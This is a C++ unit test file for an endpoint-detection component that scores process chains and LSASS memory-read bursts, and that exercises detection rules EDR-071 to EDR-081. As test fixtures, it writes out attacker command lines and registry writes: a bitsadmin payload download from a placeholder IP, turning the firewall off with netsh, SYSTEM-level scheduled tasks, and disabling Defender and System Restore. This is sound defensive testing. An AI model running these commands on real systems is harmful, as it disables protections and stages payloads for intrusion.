/*
 * behavior_enricher_tests.cpp - Unit tests for BehaviorEnricher, its config
 * block, and the production rules it feeds (EDR-071 through EDR-081).
 */
#include "behavior_enricher_tests.h"

#include <windows.h>

#include <algorithm>
#include <fstream>
#include <stdexcept>
#include <string>
#include <vector>

#include "behavior_enricher.h"
#include "config.h"
#include "edr_event.h"
#include "event_bus.h"
#include "rule_engine.h"

namespace {

#define BE_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "behavior enricher test failed at line " +
            std::to_string(line) + ": " + expression);
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

bool Has(const std::vector<std::string>& hits, const char* id) {
    return std::find(hits.begin(), hits.end(), id) != hits.end();
}

edr::Event ProcessStart(uint32_t pid, uint32_t ppid,
                        const std::string& image,
                        const std::string& parent, uint64_t ts100ns) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.pid = pid;
    event.ppid = ppid;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (!parent.empty())
        event.fields[edr::field::kParentImage] = parent;
    return event;
}

edr::Event ReadProcess(uint32_t pid, const std::string& target,
                       uint64_t bytes, uint64_t ts100ns) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_READ;
    event.ts100ns = ts100ns;
    event.pid = pid;
    event.fields[edr::field::kType] = "PROCESS_READ";
    event.fields[edr::field::kCrossProcess] = "true";
    event.fields[edr::field::kTargetImage] = target;
    if (bytes > 0)
        event.fields[edr::field::kMemorySize] = std::to_string(bytes);
    return event;
}

void TestChainScoreChromePowerShell() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);
    edr::Event first = ProcessStart(
        1001, 500,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 1000);
    enricher.Enrich(first);
    auto score = first.fields.find(edr::field::kChainScore);
    BE_CHECK(score != first.fields.end());
    BE_CHECK(std::stoi(score->second) >= 60);
    BE_CHECK(std::stoi(score->second) == 95); /* 60 browser + 25 rare + 10 first */
    const std::string reasons = first.fields.at(edr::field::kChainReasons);
    BE_CHECK(reasons.find("browser_ps") != std::string::npos);
    BE_CHECK(reasons.find("rare_parent_child") != std::string::npos);

    /* Same parent/child pair again: first_seen no longer applies. */
    edr::Event repeat = first;
    repeat.pid = 1002;
    repeat.ts100ns = 2000;
    enricher.Enrich(repeat);
    BE_CHECK(repeat.fields.at(edr::field::kChainScore) == "85");
    BE_CHECK(repeat.fields.at(edr::field::kChainReasons) ==
             "browser_ps,rare_parent_child");
}

void TestRarePairAndWhitelist() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);

    /* Rare pair (notepad -> app.exe) scores 25 + 10 on first sighting. That
     * is 35 - below the 55 SUSPICIOUS bar - so the enricher withholds the
     * field entirely; a sub-55 chain is telemetry, not a detection, and no
     * rule reads it (EDR-081 needs >=60, EDR-135 needs >=55). */
    edr::Event rare1 = ProcessStart(2001, 900,
        "C:\\Program Files\\Legit\\app.exe",
        "C:\\Windows\\System32\\notepad.exe", 1000);
    enricher.Enrich(rare1);
    BE_CHECK(rare1.fields.find(edr::field::kChainScore) ==
             rare1.fields.end());
    edr::Event rare2 = rare1;
    rare2.pid = 2002;
    rare2.ts100ns = 2000;
    enricher.Enrich(rare2);
    BE_CHECK(rare2.fields.find(edr::field::kChainScore) ==
             rare2.fields.end());

    /* Whitelisted pairs contribute nothing. */
    edr::Event svc = ProcessStart(2003, 400,
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\services.exe", 3000);
    enricher.Enrich(svc);
    BE_CHECK(svc.fields.find(edr::field::kChainScore) ==
             svc.fields.end());

    edr::Event system = ProcessStart(2004, 4,
        "C:\\Windows\\System32\\smss.exe", "", 4000);
    enricher.Enrich(system);
    BE_CHECK(system.fields.find(edr::field::kChainScore) ==
             system.fields.end());

    edr::Event explorer = ProcessStart(2005, 300,
        "C:\\Windows\\explorer.exe", "", 5000);
    enricher.Enrich(explorer);
    edr::Event child = ProcessStart(2006, 2005,
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe", 6000);
    enricher.Enrich(child);
    BE_CHECK(child.fields.find(edr::field::kChainScore) ==
             child.fields.end());

    edr::Event chrome2 = ProcessStart(2007, 2005,
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 7000);
    enricher.Enrich(chrome2);
    BE_CHECK(chrome2.fields.find(edr::field::kChainScore) ==
             chrome2.fields.end());

    /* User-writable launch adds +15 even for a whitelisted pair - still 15,
     * so still below the bar and still withheld. */
    edr::Event userWritable = ProcessStart(2008, 2005,
        "C:\\Users\\alice\\AppData\\Local\\Vendor\\app.exe",
        "C:\\Windows\\explorer.exe", 8000);
    enricher.Enrich(userWritable);
    BE_CHECK(userWritable.fields.find(edr::field::kChainScore) ==
             userWritable.fields.end());
}

void TestLruEviction() {
    edr::BehaviorEnricher enricher(2, 300, 60, 4194304);
    edr::Event first = ProcessStart(3001, 1,
        "C:\\Tools\\one.exe", "C:\\Tools\\par.exe", 1000);
    enricher.Enrich(first);
    edr::Event second = ProcessStart(3002, 1,
        "C:\\Tools\\two.exe", "C:\\Tools\\par.exe", 2000);
    enricher.Enrich(second);
    edr::Event third = ProcessStart(3003, 1,
        "C:\\Tools\\three.exe", "C:\\Tools\\par.exe", 3000);
    enricher.Enrich(third);
    BE_CHECK(enricher.ParentChildCount() == 2);

    /* The oldest pair (par -> one) was evicted, so its first_seen bonus
     * applies again when it reappears. The resulting 35 is still below the
     * 55 bar, so the field stays withheld - the eviction is observable via
     * the pair count alone. */
    edr::Event reFirst = ProcessStart(3004, 1,
        "C:\\Tools\\one.exe", "C:\\Tools\\par.exe", 4000);
    enricher.Enrich(reFirst);
    BE_CHECK(reFirst.fields.find(edr::field::kChainScore) ==
             reFirst.fields.end());
}

void TestLsassReadBurst() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);
    const uint64_t base = 10000000000ULL;

    edr::Event read1 = ReadProcess(4001,
        "C:\\Windows\\System32\\lsass.exe", 2000000, base);
    enricher.Enrich(read1);
    BE_CHECK(read1.fields.find(edr::field::kLsassReadBurstBytes) ==
             read1.fields.end());

    edr::Event read2 = ReadProcess(4001,
        "C:\\Windows\\System32\\lsass.exe", 2194304,
        base + 1ULL * 10000000ULL);
    enricher.Enrich(read2);
    BE_CHECK(read2.fields.at(edr::field::kLsassReadBurstBytes) ==
             "4194304");
    BE_CHECK(read2.fields.at(edr::field::kLsassReadBurstCount) == "2");

    /* Reads of other targets are ignored. */
    edr::Event other = ReadProcess(4001,
        "C:\\Windows\\System32\\notepad.exe", 5000000,
        base + 2ULL * 10000000ULL);
    enricher.Enrich(other);
    BE_CHECK(other.fields.find(edr::field::kLsassReadBurstBytes) ==
             other.fields.end());

    /* Reads without memory_size are ignored. */
    edr::Event noSize = ReadProcess(4002,
        "C:\\Windows\\System32\\lsass.exe", 0,
        base + 3ULL * 10000000ULL);
    enricher.Enrich(noSize);
    BE_CHECK(noSize.fields.find(edr::field::kLsassReadBurstBytes) ==
             noSize.fields.end());

    /* Window expiry resets the accumulator. */
    edr::Event late1 = ReadProcess(4001,
        "C:\\Windows\\System32\\lsass.exe", 500000,
        base + 61ULL * 10000000ULL);
    enricher.Enrich(late1);
    BE_CHECK(late1.fields.find(edr::field::kLsassReadBurstBytes) ==
             late1.fields.end());

    edr::Event late2 = ReadProcess(4001,
        "C:\\Windows\\System32\\lsass.exe", 3694304,
        base + 62ULL * 10000000ULL);
    enricher.Enrich(late2);
    BE_CHECK(late2.fields.at(edr::field::kLsassReadBurstBytes) ==
             "4194304");
    BE_CHECK(late2.fields.at(edr::field::kLsassReadBurstCount) == "2");
}

void TestLsassReadBurstPerPid() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);
    const uint64_t base = 20000000000ULL;

    /* Two different readers each reading 3 MB must NOT combine across pids
     * (a global bucket would falsely attribute a burst to both). */
    edr::Event a1 = ReadProcess(4101,
        "C:\\Windows\\System32\\lsass.exe", 3145728, base);
    enricher.Enrich(a1);
    BE_CHECK(a1.fields.find(edr::field::kLsassReadBurstBytes) ==
             a1.fields.end());
    edr::Event b1 = ReadProcess(4102,
        "C:\\Windows\\System32\\lsass.exe", 3145728, base + 10000000);
    enricher.Enrich(b1);
    BE_CHECK(b1.fields.find(edr::field::kLsassReadBurstBytes) ==
             b1.fields.end());

    /* One reader crossing the threshold alone is attributed to it only. */
    edr::Event b2 = ReadProcess(4102,
        "C:\\Windows\\System32\\lsass.exe", 1048576, base + 20000000);
    enricher.Enrich(b2);
    BE_CHECK(b2.fields.at(edr::field::kLsassReadBurstBytes) == "4194304");
    BE_CHECK(b2.fields.at(edr::field::kLsassReadBurstCount) == "2");
}

void TestLsassReadBurstOutOfOrder() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);
    const uint64_t base = 30000000000ULL;

    /* A read timestamped before the window start (clock drift / out-of-order
     * delivery) must not inflate the current window: it starts a fresh one. */
    edr::Event first = ReadProcess(4201,
        "C:\\Windows\\System32\\lsass.exe", 4194304, base);
    enricher.Enrich(first);
    BE_CHECK(first.fields.at(edr::field::kLsassReadBurstBytes) ==
             "4194304");

    edr::Event stale = ReadProcess(4201,
        "C:\\Windows\\System32\\lsass.exe", 4194304, base - 500000000);
    enricher.Enrich(stale);
    BE_CHECK(stale.fields.at(edr::field::kLsassReadBurstBytes) ==
             "4194304");
    BE_CHECK(stale.fields.at(edr::field::kLsassReadBurstCount) == "1");
}

void TestUserWritablePathSystemExclusion() {
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);

    /* C:\Windows\Temp is a system directory, not user-writable: no +15. */
    edr::Event sysTemp = ProcessStart(4301, 4,
        "C:\\Windows\\Temp\\setup.exe", "", 1000);
    enricher.Enrich(sysTemp);
    BE_CHECK(sysTemp.fields.find(edr::field::kChainScore) ==
             sysTemp.fields.end());

    /* A genuinely user-writable temp location still scores (+15 for a
     * whitelisted ppid=4 pair) - but 15 is below the 55 bar, so withheld. */
    edr::Event userTemp = ProcessStart(4302, 4,
        "C:\\Users\\alice\\AppData\\Local\\Temp\\setup.exe", "", 2000);
    enricher.Enrich(userTemp);
    BE_CHECK(userTemp.fields.find(edr::field::kChainScore) ==
             userTemp.fields.end());
}

void TestBehaviorEnrichConfigStrictAtomic() {
    edr::Config defaults;
    BE_CHECK(!defaults.behaviorEnrichEnable);
    BE_CHECK(defaults.behaviorEnrichStateCapacity == 8192);
    BE_CHECK(defaults.behaviorEnrichWindowSeconds == 300);
    BE_CHECK(defaults.behaviorEnrichLsassBurstWindowSeconds == 60);
    BE_CHECK(defaults.behaviorEnrichLsassBurstThresholdBytes == 4194304ULL);

    const char* path = "edr-native-behavior-enrich-config.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"behavior_enrich":{"enable":true,"state_capacity":1024,"window_seconds":120,"lsass_burst_window_seconds":30,"lsass_burst_threshold_bytes":8388608}})";
    }
    edr::Config config;
    std::string error;
    BE_CHECK(edr::LoadConfigFile(path, config, error));
    BE_CHECK(config.behaviorEnrichEnable);
    BE_CHECK(config.behaviorEnrichStateCapacity == 1024);
    BE_CHECK(config.behaviorEnrichWindowSeconds == 120);
    BE_CHECK(config.behaviorEnrichLsassBurstWindowSeconds == 30);
    BE_CHECK(config.behaviorEnrichLsassBurstThresholdBytes == 8388608ULL);

    for (const char* invalid : {
        R"({"behavior_enrich":true})",
        R"({"behavior_enrich":{"unknown":1}})",
        R"({"behavior_enrich":{"enable":"true"}})",
        R"({"behavior_enrich":{"state_capacity":127}})",
        R"({"behavior_enrich":{"state_capacity":65537}})",
        R"({"behavior_enrich":{"window_seconds":29}})",
        R"({"behavior_enrich":{"window_seconds":3601}})",
        R"({"behavior_enrich":{"window_seconds":30.5}})",
        R"({"behavior_enrich":{"lsass_burst_window_seconds":4}})",
        R"({"behavior_enrich":{"lsass_burst_threshold_bytes":1048575}})",
        R"({"behavior_enrich":{"lsass_burst_threshold_bytes":1.5}})"}) {
        std::ofstream out(path, std::ios::binary);
        out << invalid;
        out.close();
        edr::Config unchanged;
        unchanged.behaviorEnrichStateCapacity = 777;
        unchanged.behaviorEnrichWindowSeconds = 222;
        unchanged.behaviorEnrichLsassBurstThresholdBytes = 12345ULL;
        BE_CHECK(!edr::LoadConfigFile(path, unchanged, error));
        BE_CHECK(unchanged.behaviorEnrichStateCapacity == 777);
        BE_CHECK(unchanged.behaviorEnrichWindowSeconds == 222);
        BE_CHECK(unchanged.behaviorEnrichLsassBurstThresholdBytes == 12345ULL);
    }
    DeleteFileA(path);
}

void TestEdr081EnricherPipeline() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });
    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);

    /* Positive: chrome -> powershell chain scores 95. */
    hits.clear();
    edr::Event positive = ProcessStart(
        5001, 300,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 1000);
    enricher.Enrich(positive);
    engine.OnEvent(positive);
    BE_CHECK(Has(hits, "EDR-081"));

    /* Negative: whitelisted pair gets no chain_score. */
    hits.clear();
    edr::Event negative = ProcessStart(5002, 300,
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe", 2000);
    enricher.Enrich(negative);
    engine.OnEvent(negative);
    BE_CHECK(!Has(hits, "EDR-081"));

    /* Negative: low score is withheld by the enricher, so there is no field
     * for the engine to read at all. */
    hits.clear();
    edr::Event low = ProcessStart(5003, 300,
        "C:\\Program Files\\Legit\\app.exe",
        "C:\\Windows\\System32\\notepad.exe", 3000);
    enricher.Enrich(low);
    BE_CHECK(low.fields.find(edr::field::kChainScore) ==
             low.fields.end());
    engine.OnEvent(low);
    BE_CHECK(!Has(hits, "EDR-081"));

    /* Negative/positive boundaries on the raw field. */
    hits.clear();
    edr::Event direct;
    direct.type = EDR_EVT_PROCESS_START;
    direct.fields[edr::field::kType] = "PROCESS_START";
    direct.fields[edr::field::kChainScore] = "45";
    engine.OnEvent(direct);
    BE_CHECK(!Has(hits, "EDR-081"));
    hits.clear();
    direct.fields[edr::field::kChainScore] = "54";
    engine.OnEvent(direct);
    BE_CHECK(!Has(hits, "EDR-081"));
    hits.clear();
    direct.fields[edr::field::kChainScore] = "60";
    engine.OnEvent(direct);
    BE_CHECK(Has(hits, "EDR-081"));
    hits.clear();
    direct.fields[edr::field::kChainScore] = "100";
    engine.OnEvent(direct);
    BE_CHECK(Has(hits, "EDR-081"));
}

/* Exact hit-set assertion: sorted actual hits must equal sorted expected. */
void ExpectHits(const std::vector<std::string>& hits,
                std::vector<std::string> expected) {
    std::vector<std::string> actual = hits;
    std::sort(actual.begin(), actual.end());
    std::sort(expected.begin(), expected.end());
    BE_CHECK(actual == expected);
}

void TestNewProductionRules() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-071: BITS admin tool download. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] = "C:\\Windows\\System32\\bitsadmin.exe";
        ev.fields[edr::field::kCommandLine] =
            "bitsadmin /transfer job http://192.0.2.1/p.exe "
            "C:\\Users\\a\\AppData\\Local\\Temp\\p.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-071"});
        hits.clear();
        ev.fields[edr::field::kCommandLine] = "bitsadmin /list /allusers";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-072: BITS job file landing on disk. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_FILE_CREATE;
        ev.fields[edr::field::kType] = "FILE_CREATE";
        ev.fields[edr::field::kFilePath] =
            "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr0.dat";
        ev.fields[edr::field::kImage] = "C:\\Users\\a\\Downloads\\bad.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-072"});
        hits.clear();
        ev.fields[edr::field::kFilePath] =
            "C:\\ProgramData\\Microsoft\\Network\\qmgr0.dat";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
        hits.clear();
        ev.fields[edr::field::kFilePath] =
            "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr0.dat";
        ev.fields[edr::field::kImage] = "C:\\Windows\\System32\\svchost.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-073: single large LSASS memory read (>= 4 MB). */
    {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_READ;
        ev.fields[edr::field::kType] = "PROCESS_READ";
        ev.fields[edr::field::kCrossProcess] = "true";
        ev.fields[edr::field::kTargetImage] =
            "C:\\Windows\\System32\\lsass.exe";
        ev.fields[edr::field::kMemorySize] = "4194304";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-060", "EDR-073"});
        hits.clear();
        ev.fields[edr::field::kMemorySize] = "3999999";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-060"});
    }

    /* EDR-074: System Restore disabled. */
    {
        hits.clear();
        edr::Event ev;
        ev.type = EDR_EVT_REG_WRITE;
        ev.fields[edr::field::kType] = "REG_WRITE";
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            "SystemRestore\\DisableSR";
        ev.fields[edr::field::kRegValue] = "DisableSR";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-074"});
        hits.clear();
        ev.fields[edr::field::kRegValue] = "0";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-075: firewall service start-type disabled. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_REG_WRITE;
        ev.fields[edr::field::kType] = "REG_WRITE";
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MpsSvc\\Start";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-075"});
        hits.clear();
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS\\Start";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
        hits.clear();
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MpsSvc\\Parameters";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-076: firewall policy switched off via netsh. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] = "C:\\Windows\\System32\\netsh.exe";
        ev.fields[edr::field::kCommandLine] =
            "netsh advfirewall set allprofiles state off";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-076"});
        hits.clear();
        ev.fields[edr::field::kCommandLine] = "netsh advfirewall reset";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-077: Defender real-time protection disabled. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_REG_WRITE;
        ev.fields[edr::field::kType] = "REG_WRITE";
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\"
            "Real-Time Protection\\DisableRealtimeMonitoring";
        ev.fields[edr::field::kRegValue] = "DisableRealtimeMonitoring";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-077"});
        hits.clear();
        ev.fields[edr::field::kRegKey] =
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\"
            "Real-Time Protection\\ExclusionPath";
        ev.fields[edr::field::kRegValue] = "C:\\evil.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-078: high-privilege scheduled task via schtasks. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] =
            "C:\\Windows\\System32\\schtasks.exe";
        ev.fields[edr::field::kCommandLine] =
            "schtasks /create /tn Update /ru SYSTEM /sc onlogon";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-011", "EDR-078"});
        hits.clear();
        ev.fields[edr::field::kCommandLine] =
            "schtasks /create /tn Update /sc onlogon";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-011"});
    }

    /* EDR-079: privileged task registration via PowerShell. */
    {
        hits.clear();
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] =
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        ev.fields[edr::field::kCommandLine] =
            "powershell -Command \"Register-ScheduledTask -TaskName Upd "
            "-RunLevel Highest -Action (New-ScheduledTaskAction -Execute "
            "cmd.exe)\"";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-018", "EDR-079"});
        hits.clear();
        ev.fields[edr::field::kCommandLine] =
            "powershell -Command \"Register-ScheduledTask -TaskName Upd\"";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-018"});
    }

    /* EDR-080: browser spawning PowerShell. */
    {
        hits.clear();
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] =
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        ev.fields[edr::field::kParentImage] =
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-080"});
        hits.clear();
        ev.fields[edr::field::kParentImage] =
            "C:\\Windows\\System32\\svchost.exe";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
    }

    /* EDR-081: chain score threshold. */
    {
        edr::Event ev;
        ev.type = EDR_EVT_PROCESS_START;
        ev.fields[edr::field::kType] = "PROCESS_START";
        ev.fields[edr::field::kImage] =
            "C:\\Windows\\System32\\notepad.exe";
        ev.fields[edr::field::kParentImage] = "C:\\Windows\\explorer.exe";
        ev.fields[edr::field::kChainScore] = "75";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-081"});
        hits.clear();
        ev.fields[edr::field::kChainScore] = "45";
        engine.OnEvent(ev);
        ExpectHits(hits, {});
        hits.clear();
        ev.fields[edr::field::kChainScore] = "100";
        engine.OnEvent(ev);
        ExpectHits(hits, {"EDR-081"});
    }
}

} // namespace

void RunBehaviorEnricherTests() {
    TestChainScoreChromePowerShell();
    TestRarePairAndWhitelist();
    TestLruEviction();
    TestLsassReadBurst();
    TestLsassReadBurstPerPid();
    TestLsassReadBurstOutOfOrder();
    TestUserWritablePathSystemExclusion();
    TestBehaviorEnrichConfigStrictAtomic();
    TestEdr081EnricherPipeline();
    TestNewProductionRules();
}
